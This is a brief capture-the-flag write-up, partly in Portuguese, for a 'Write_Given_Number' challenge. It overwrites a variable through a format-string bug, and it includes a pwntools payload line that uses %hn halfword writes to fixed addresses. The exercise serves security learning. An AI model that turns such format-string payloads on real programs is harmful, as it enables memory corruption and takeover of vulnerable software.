# Challenge `Write_Given_Number` writeup

- Vulnerability: What type of vulnerability is being exploited
  -Format Strings
- Where: Where is the vulnerability present
  - BUffer
- Impact: What results of exploiting this vulnerability
  - Alterar o valor de uma variavel

## Steps to reproduce

1. No meu script recebi o address random dividi em 2 partes
p1 = rand_int_0_3 - 8 (primeiro endereço)
p2 = rand_int_4_end - rand_int_0_3

2. 0x804a070 endreço 7, endereço 8 0x804a070
s.send(p32(0x804a072) + p32(0x804a070) + b"%" +bytes(str(p1), 'utf-8') + b"x%7$hn%" +bytes(str(p2), 'utf-8') + b"x%8$hn")


[(POC)](Write_Given_Number.py)
